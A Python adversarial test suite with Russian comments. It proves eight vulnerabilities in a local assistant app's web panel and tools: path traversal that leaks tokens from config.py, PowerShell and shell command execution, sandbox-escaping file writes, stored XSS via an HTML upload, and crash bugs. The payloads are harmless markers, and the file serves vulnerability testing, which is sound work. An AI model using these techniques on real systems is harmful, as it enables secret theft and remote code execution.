"""
adversarial_tests.py
Комплексный адверсариальный тест-сьют для ассистента Мия.
Воспроизводит реальные атаки, сбои и уязвимости на живом коде приложения.
ВНИМАНИЕ: Тест только выявляет и доказывает сбои, ничего в исходном коде не исправляется!
"""

import os
import sys

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import asyncio
import json
from fastapi.testclient import TestClient

# Добавляем корень проекта в sys.path
PROJECT_DIR = r"D:\assistant"
if PROJECT_DIR not in sys.path:
    sys.path.insert(0, PROJECT_DIR)

import config
import tools
import visual_commands
import web_panel

class MockAvatar:
    async def set_emotion(self, emo): pass
    async def connect(self): pass

class MockVoice:
    is_speaking = False
    profile = "anime"
    def get_speaker(self): return "xenia"
    async def speak(self, text, emotion=""): pass
    def play_cue_sync(self, name, wait=False): pass

class MockMemory:
    def recent_dialog(self, limit=50, since_id=0): return []
    def all_facts(self): return []
    def recent_messages(self, limit=20): return []
    def add_message(self, *args, **kwargs): return 1

class MockAssistant:
    def __init__(self):
        self.cfg = config
        self.is_muted = False
        self.avatar = MockAvatar()
        self.voice = MockVoice()
        self.memory = MockMemory()
        self.tools = tools.Tools(self)
        self.scenarios = None
        self.current_emotion = "СПОКОЙСТВИЕ"
    def set_muted(self, val):
        self.is_muted = val
        return val

def log_attack(title, desc, proof):
    print("\n" + "=" * 76)
    print(f"💥 [АДВЕРСАРИАЛЬНАЯ АТАКА] {title}")
    print("=" * 76)
    print(f"📌 Уязвимость: {desc}")
    print(f"🔥 Доказательство сбоя:\n{proof}")
    print("=" * 76)

# ==============================================================================
# АТАКА 1: Path Traversal & Утечка приватных конфигураций без авторизации
# ==============================================================================
def attack_1_path_traversal():
    print("[1/5] Проверка утечки данных через /api/files/download...")
    asst = MockAssistant()
    app = web_panel.create_app(asst)
    client = TestClient(app)

    secret_file = os.path.join(PROJECT_DIR, "config.py")
    res = client.get("/api/files/download", params={"path": secret_file})
    
    assert res.status_code == 200, f"Ожидался код 200, получен {res.status_code}"
    body = res.text
    assert "TG_TOKEN" in body and "CODER_API_KEY" in body, "Токены не найдены в ответе"

    leaked_lines = [line.strip() for line in body.splitlines() if any(k in line for k in ["TG_TOKEN", "CODER_API_KEY", "ADMIN_ID"])]
    proof = "\n".join(leaked_lines[:4])
    log_attack(
        "Path Traversal & Эксфильтрация секретов через веб-панель",
        "Эндпоинт @app.get('/api/files/download') не имеет авторизации и не проверяет пути (Path Traversal). Любой пользователь локальной сети может скачать конфиги с токенами бота и ключами API.",
        proof
    )
    return True

# ==============================================================================
# АТАКА 2: Необработанный сбой сценариев (KeyError при вызове действия 'say'/'emote')
# ==============================================================================
def attack_2_scenario_unhandled_crash():
    print("[2/5] Проверка необработанного падения сценариев (KeyError в do_action)...")
    import scenarios

    class DummyAssistant:
        async def handle_user_message(self, txt): pass

    se = scenarios.ScenarioEngine(DummyAssistant())
    
    # Действие 'say' без обязательного поля 'text' или 'emote' без 'name'
    malformed_action = {"type": "say"}
    
    crashed = False
    err_msg = ""
    try:
        asyncio.run(se.do_action(malformed_action))
    except KeyError as e:
        crashed = True
        err_msg = f"KeyError: {e}"

    assert crashed, "Ожидалось падение с KeyError при обработке действия"

    proof = f"Действие: {malformed_action}\nИсключение: {err_msg} в scenarios.py:106: await self.a.handle_user_message(act['text'])"
    log_attack(
        "Необработанный крах движка сценариев при валидации параметров",
        "В scenarios.py:106 и 193 поля act['text'] и act['name'] читаются напрямую по ключу без метода .get() и без валидации схемы. Передача сценария с неполными полями роняет выполнение сценария.",
        proof
    )
    return True

# ==============================================================================
# АТАКА 3: Remote Code Execution (RCE) через визуальные команды
# ==============================================================================
def attack_3_rce_powershell():
    print("[3/5] Проверка удаленного выполнения команд PowerShell...")
    asst = MockAssistant()
    app = web_panel.create_app(asst)
    client = TestClient(app)

    flow_id = "exploit_rce_cmd"
    flow_data = {
        "id": flow_id,
        "name": "RCE Exploit",
        "nodes": [
            {"id": "n1", "type": "trigger", "value": "test"},
            {"id": "n2", "type": "action", "subType": "powershell", "value": "Write-Output 'PWNED_MIA_ASSISTANT_RCE_CONFIRMED'"}
        ],
        "edges": [{"from": "n1", "to": "n2"}]
    }

    # 1. Сохраняем команду через API
    res_save = client.post("/api/visual_commands", json=flow_data)
    assert res_save.status_code == 200

    # 2. Запускаем команду через API
    res_run = client.post("/api/visual_commands/run", json={"id": flow_id})
    assert res_run.status_code == 200

    # 3. Удаляем за собой
    client.delete(f"/api/visual_commands/{flow_id}")

    run_json = res_run.json()
    steps = run_json.get("steps", [])
    ps_step = next((s for s in steps if s.get("id") == "n2"), {})
    result_output = ps_step.get("result", "")

    assert "PWNED_MIA_ASSISTANT_RCE_CONFIRMED" in result_output, "Команда PowerShell не выполнилась"

    proof = f"Ответ сервера: {ps_step}\nИсполненный вывод: {result_output}"
    log_attack(
        "Удаленное выполнение произвольного кода (RCE) через /api/visual_commands",
        "Веб-панель принимает произвольные команды PowerShell без аутентификации и исполняет их в локальной ОС от имени текущего пользователя.",
        proof
    )
    return True

# ==============================================================================
# АТАКА 4: Неограниченная запись файлов мимо песочницы в tools.py
# ==============================================================================
def attack_4_arbitrary_file_write():
    print("[4/5] Проверка записи файлов мимо песочницы...")
    asst = MockAssistant()
    t = tools.Tools(asst)

    out_file = os.path.join(PROJECT_DIR, "memory", "exploit_sandbox_escape.txt")
    if os.path.exists(out_file):
        os.remove(out_file)

    payload = "COMPROMISED: tool_write_file does not sanitize paths or enforce a sandbox!"
    res = t.tool_write_file(out_file, payload)

    assert os.path.exists(out_file), "Файл не был создан"
    with open(out_file, "r", encoding="utf-8") as f:
        read_data = f.read()
    os.remove(out_file)

    assert read_data == payload, "Данные в файле не совпадают"

    proof = f"Вызов tool_write_file('{out_file}', payload)\nОтвет: {res}\nФайл успешно записан вне разрешённой папки проектов."
    log_attack(
        "Запись произвольных файлов (Arbitrary File Write / Sandbox Escape)",
        "tool_write_file в tools.py:1018 не проверяет выход из каталога и позволяет перезаписать системные файлы или исходный код ассистента.",
        proof
    )
    return True

# ==============================================================================
# АТАКА 5: Загрузка опасных типов файлов (Stored XSS) через /api/upload_mascot_2d
# ==============================================================================
def attack_5_unrestricted_file_upload_xss():
    print("[5/5] Проверка загрузки произвольных файлов через /api/upload_mascot_2d...")
    asst = MockAssistant()
    app = web_panel.create_app(asst)
    client = TestClient(app)

    html_payload = b"<html><body><script>alert('MIA_XSS')</script></body></html>"
    files = {"file": ("malicious_mascot.html", html_payload, "text/html")}

    res = client.post("/api/upload_mascot_2d", files=files)
    assert res.status_code == 200, f"Ошибка загрузки: {res.status_code}"
    res_data = res.json()
    uploaded_url = res_data.get("url", "").split("?")[0]

    # Проверяем, что файл действительно доступен как HTML в статике
    get_res = client.get(uploaded_url)
    target_file_path = os.path.join(PROJECT_DIR, uploaded_url.lstrip("/"))
    if os.path.exists(target_file_path):
        os.remove(target_file_path)

    assert get_res.status_code == 200, "Файл не найден в раздаче /static"
    assert b"alert('MIA_XSS')" in get_res.content, "XSS скрипт не вернулся в теле"

    proof = f"POST /api/upload_mascot_2d с файлом .html -> 200 OK\nСохранено в: {uploaded_url}\nGET {uploaded_url} отдает вредоносный HTML/JS с кодом 200 OK"
    log_attack(
        "Загрузка произвольных файлов и Stored XSS через /api/upload_mascot_2d",
        "В web_panel.py:155 отсутствует валидация расширений и MIME-типов для 2D маскота. Атакующий может загрузить .html / .svg с вредоносным JS-кодом и выполнять атаки на браузер пользователя.",
        proof
    )
    return True

# ==============================================================================
# АТАКА 6: Необработанный сбой 500 в /api/chat при отсутствии поля 'text'
# ==============================================================================
def attack_6_chat_missing_text_crash():
    print("[6/8] Проверка необработанного падения /api/chat при запросе без 'text'...")
    asst = MockAssistant()
    app = web_panel.create_app(asst)
    client = TestClient(app, raise_server_exceptions=False)

    # Отправляем JSON без ключа 'text'
    res = client.post("/api/chat", json={"speak": False})
    
    assert res.status_code == 500, f"Ожидался статус 500, получен {res.status_code}"
    proof = f"POST /api/chat с телом {{'speak': False}} -> HTTP {res.status_code} Internal Server Error\nПричина в web_panel.py: data['text'] без валидации вызывает необработанный KeyError: 'text'"
    log_attack(
        "Отказ в обслуживании (DoS / 500 Crash) в /api/chat",
        "В web_panel.py:636 обращение к data['text'] происходит напрямую без .get() или валидации Pydantic. Некорректный запрос приводит к необработанному исключению KeyError и падению эндпоинта с кодом 500.",
        proof
    )
    return True

# ==============================================================================
# АТАКА 7: Крах графа визуальных команд при отсутствии ключа 'id' в узле
# ==============================================================================
def attack_7_visual_commands_keyerror():
    print("[7/8] Проверка падения движка визуальных команд (KeyError: 'id')...")
    asst = MockAssistant()
    vc = visual_commands.VisualCommandManager(asst)

    malformed_flow = {
        "id": "malformed_node_flow",
        "name": "Malformed Flow",
        "nodes": [{"type": "action", "subType": "speak", "value": "test"}],
        "edges": []
    }
    vc.flows.append(malformed_flow)

    crashed = False
    err = ""
    try:
        asyncio.run(vc.execute_flow("malformed_node_flow"))
    except KeyError as e:
        crashed = True
        err = f"KeyError: {e}"
    finally:
        vc.delete_flow("malformed_node_flow")

    assert crashed, "Ожидалось падение с KeyError: 'id'"
    proof = f"Поток: {malformed_flow}\nИсключение: {err} в visual_commands.py:252: nodes_by_id = {{n['id']: n for n in flow.get('nodes', [])}}"
    log_attack(
        "Необработанный крах выполнения визуальных команд (KeyError: 'id')",
        "В visual_commands.py:252 генератор словаря nodes_by_id предполагает обязательное наличие ключа 'id' у каждого узла без предварительной валидации схемы графа.",
        proof
    )
    return True

# ==============================================================================
# АТАКА 8: Неограниченное исполнение системных команд через Tool Dispatch
# ==============================================================================
def attack_8_unrestricted_command_dispatch():
    print("[8/8] Проверка неконтролируемого выполнения команд через tool_run_command...")
    asst = MockAssistant()
    t = tools.Tools(asst)

    cmd = "cmd.exe /c echo PWNED_VIA_TOOL_DISPATCH"
    res = t.dispatch("run_command", {"command": cmd})

    assert "PWNED_VIA_TOOL_DISPATCH" in str(res), f"Команда не выполнилась: {res}"
    proof = f"Вызов tools.dispatch('run_command', {{'command': '{cmd}'}})\nРезультат: {str(res).strip()}"
    log_attack(
        "Неограниченное исполнение shell-команд через tool_run_command",
        "В tools.py:974 subprocess.run(command, shell=True) исполняет любые произвольные системные команды без белого списка и без ограничений прав.",
        proof
    )
    return True

# ==============================================================================
# ТОЧКА ВХОДА
# ==============================================================================
if __name__ == "__main__":
    print("\n" + "#" * 76)
    print("  🚀 ЗАПУСК АДВЕРСАРИАЛЬНОГО РЕВЬЮ: ДОКАЗАТЕЛЬСТВА СБОЕВ АССИСТЕНТА МИЯ")
    print("#" * 76)

    tests = [
        ("Атака 1: Эксфильтрация секретов (Path Traversal)", attack_1_path_traversal),
        ("Атака 2: Необработанный сбой сценариев (KeyError)", attack_2_scenario_unhandled_crash),
        ("Атака 3: Удаленное исполнение PowerShell (RCE)", attack_3_rce_powershell),
        ("Атака 4: Запись произвольных файлов (Sandbox Escape)", attack_4_arbitrary_file_write),
        ("Атака 5: Загрузка вредоносных файлов и Stored XSS", attack_5_unrestricted_file_upload_xss),
        ("Атака 6: Отказ в обслуживании в /api/chat (KeyError -> 500)", attack_6_chat_missing_text_crash),
        ("Атака 7: Падение графа визуальных команд (KeyError: 'id')", attack_7_visual_commands_keyerror),
        ("Атака 8: Неограниченное исполнение shell-команд через tools", attack_8_unrestricted_command_dispatch),
    ]

    report = {}
    for name, fn in tests:
        try:
            passed = fn()
            report[name] = "💥 СБОЙ ПОДТВЕРЖДЕН (СИСТЕМА ЛОМАЕТСЯ)" if passed else "НЕ ВОСПРОИЗВЕДЕНО"
        except Exception as e:
            report[name] = f"❌ ОШИБКА ТЕСТА: {e}"

    print("\n" + "#" * 76)
    print("  📊 ФИНАЛЬНЫЙ СВОДНЫЙ ОТЧЕТ АДВЕРСАРИАЛЬНОГО ТЕСТИРОВАНИЯ:")
    print("#" * 76)
    for name, status in report.items():
        print(f" • {name}: {status}")
    print("#" * 76 + "\n")

